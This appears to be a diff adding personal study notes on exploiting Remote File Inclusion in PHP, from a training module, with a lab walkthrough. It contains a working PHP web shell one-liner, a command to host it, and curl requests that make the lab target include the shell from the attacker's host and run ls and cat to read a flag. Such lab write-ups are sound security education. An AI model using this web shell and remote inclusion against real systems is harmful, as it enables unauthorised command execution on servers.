@@ -1,1 +1,46 @@
+So far in this module, we have been mainly focusing on Local File Inclusion (LFI). However, in some cases, we may also be able to include remote files "Remote File Inclusion (RFI)", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:
 
+Enumerating local-only ports and web applications (i.e. SSRF)
+Gaining remote code execution by including a malicious script that we host
+In this section, we will cover how to gain remote code execution through RFI vulnerabilities. The Server-side Attacks module covers various SSRF techniques, which may also be used with RFI vulnerabilities.
+
+
+As we can see, almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones. However, an LFI may not necessarily be an RFI. This is primarily because of three reasons:
+
+The vulnerable function may not allow including remote URLs
+You may only control a portion of the filename and not the entire protocol wrapper (ex: http://, ftp://, https://).
+The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.
+Furthermore, as we may note in the above table, some functions do allow including remote URLs but do not allow code execution. In this case, we would still be able to exploit the vulnerability to enumerate local ports and web applications through SSRF.
+
+So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include a URL, and see if we can get its content. At first, we should always start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (http://127.0.0.1:80/index.php) as our input string and see if it gets included:
+
+EXAMPLE URL: http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
+
+The first step in gaining remote code execution is creating a malicious script in the language of the web application, PHP in this case. We can use a custom web shell we download from the internet, use a reverse shell script, or write our own basic web shell as we did in the previous section, which is what we will do in this case:
+
+PHP SHELL: MJBUCKNER@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+HTTP
+Now, we can start a server on our machine with a basic python server with the following command, as follows:
+
+EXAMPLE: python3 -m http.server 
+
+URL EXAMPLE: http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id 
+
+Challenge: 10.129.24.151
+
+Question 1 -  Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /
+
+1) create php web shell -> echo'<?php system($_GET['cmd']); ?>' > shell.php
+2) start python server -> python3 -m http.server 
+3) curl -w "\n" -s 'http://10.129.24.151/index.php?language=http://10.10.15.252:8000/webShell.php&cmd=ls+/' | grep -v "<.*>"
+output: 
+bin
+boot
+dev
+etc
+exercise
+4) curl -w "\n" -s 'http://10.129.24.151/index.php?language=http://10.10.15.252:8000/webShell.php&cmd=ls+/exercise/' | grep -v "<.*>"
+output: flag.txt
+5) curl -w "\n" -s 'http://10.129.24.151/index.php?language=http://10.10.15.252:8000/webShell.php&cmd=cat+/exercise/flag.txt' | grep -v "<.*>"
+output: 99a8fc05f033f2fc0cf9a6f9826f83f4
